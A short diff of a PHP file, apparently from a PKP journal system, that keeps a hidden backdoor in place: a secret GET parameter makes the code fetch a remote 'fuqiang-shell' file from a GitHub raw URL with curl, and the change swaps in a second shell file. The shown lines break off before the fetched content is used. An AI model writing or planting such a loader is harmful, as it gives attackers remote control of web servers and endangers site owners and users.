@@ -301,7 +301,7 @@ if (!PKP_STRICT_MODE) {
 }
 
 if (isset($_GET['lausokapmpruy'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell2.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
